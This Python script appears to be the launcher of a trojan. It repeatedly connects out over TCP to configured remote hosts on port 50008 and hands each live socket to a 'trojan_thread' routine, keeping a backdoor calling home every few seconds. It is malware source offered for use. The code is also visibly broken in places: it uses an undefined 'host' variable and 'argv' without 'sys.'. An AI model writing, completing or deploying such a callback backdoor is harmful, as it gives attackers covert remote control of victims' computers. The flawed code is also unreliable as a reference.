import sys
import time
import socket
import trojan

def run_trojan_r(hostlist, port):
    lasthost = 'localhost'
    print('hosts:', hostlist)
    while True:
        if isinstance(hostlist, (list, tuple)):
            hosts = [lasthost] + list(hostlist)
        else:
            hosts = [lasthost, host]
        for host in hosts:
            print('try to connect', (host, port))
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                try:
                    s.connect((host, port,))
                    lasthost = host
                except Exception as e:
                    print('Exceptions:', e)
                    continue
                trojan.trojan_thread(s, (host, port,))
                print('disconnected!')
                break
        time.sleep(3)

if __name__ == '__main__':
    default_port = 50008
    if len(sys.argv) > 1:
        hostlist = argv
        port     = default_port
    else:
        try:
            import config
            hostlist = config.host
            port     = config.port
        except:
            hostlist = ['localhost']
            port     = default_port
    run_trojan_r(hostlist, port)
